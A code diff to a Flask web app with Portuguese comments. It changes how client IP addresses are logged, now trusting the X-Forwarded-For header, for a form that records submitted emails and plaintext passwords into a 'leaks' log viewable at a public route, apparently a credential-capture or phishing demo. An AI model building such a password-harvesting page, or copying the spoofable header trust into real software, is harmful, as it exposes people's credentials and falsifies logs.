@@ -16,6 +16,16 @@ limiter = Limiter(
     default_limits=["50 per minute", "10 per second"] # Limita a conexão para evitar ataques DoS
     )
 
+
+def get_client_ip():
+    # Primeiro, verifique se o cabeçalho X-Forwarded-For está presente
+    if 'X-Forwarded-For' in request.headers:
+        # O cabeçalho X-Forwarded-For pode conter uma lista de endereços IP separados por vírgula
+        # O endereço IP do cliente é geralmente o primeiro na lista
+        return request.headers.get('X-Forwarded-For').split(',')[0]
+    # Se o cabeçalho X-Forwarded-For não estiver presente, retorne o endereço IP remoto padrão
+    return request.remote_addr
+
 @app.route('/leaks')
 def log():
     return render_template('log.html', log=leaklog.log)
@@ -35,7 +45,7 @@ def sobre():
                 {
                     "email":form.email.data,
                     "password":form.password.data,
-                    "ip_address":str(request.remote_addr),
+                    "ip_address":str(get_client_ip()),
                     "timestamp": datetime.now()
                 }
             )
@@ -51,6 +61,6 @@ def clear_leak():
 app.jinja_env.globals.update(format_relative_time=relative_timedelta.format_relative_time)
 
 def create_app():
-    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1) # Resolve o Proxy para obter o endereço IP real do cliente 
+    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_host=1) # Resolve o Proxy para obter o endereço IP real do cliente 
     return app
     
